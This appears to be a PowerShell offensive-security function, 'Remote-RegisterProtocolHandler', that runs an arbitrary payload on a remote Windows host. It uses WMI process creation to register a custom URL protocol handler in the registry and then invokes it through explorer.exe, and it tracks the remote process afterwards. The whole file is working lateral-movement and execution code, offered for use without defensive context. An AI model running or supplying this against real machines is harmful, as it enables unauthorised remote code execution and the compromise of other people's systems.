function Remote-RegisterProtocolHandler {
	param(
		[Parameter(Mandatory=$True)]
		[string]$Payload,
		[Parameter(Mandatory=$True)]
		[string]$ComputerName,
		[Parameter(Mandatory=$False)]
		[string]$Handler = "ms-browse"
	)
	
	BEGIN {
		Write-Output "[+] Executing payload on $($ComputerName)"
	}
	
	PROCESS {
		$Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]::CurrentUser, $ComputerName) 
		
		$Command = "cmd.exe /Q /c reg add HKEY_CURRENT_USER\Software\Classes\$($Handler) /d ""URL: $($Handler)"" /v ""URL Protocol"" /f && reg add HKEY_CURRENT_USER\Software\Classes\$($Handler)\shell\open\command /d ""$($Payload)"" && explorer.exe $($Handler)://"
		
		Write-Output "[+] Invoking $($Command) over WMI"
		
		$Process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $Command
		
		Try {
			Write-Output "[+] Remote Process PID: $($process.ProcessId)"
			Register-WmiEvent -ComputerName $ComputerName -Query "Select * from Win32_ProcessStopTrace Where ProcessID=$($process.ProcessId)" -Action {
				$state = $event.SourceEventArgs.NewEvent;
				Write-Host "[+] Remote process status:`nPID: $($state.ProcessId)`nState: $($state.State)`nStatus: $($state.Status)" 
			}
		} Catch {
			$_
			Write-Host "[-] Process Status couldn't be retrieved"
		}
	}

	END {
		Write-Output "[+] Process completed..."
	}
}
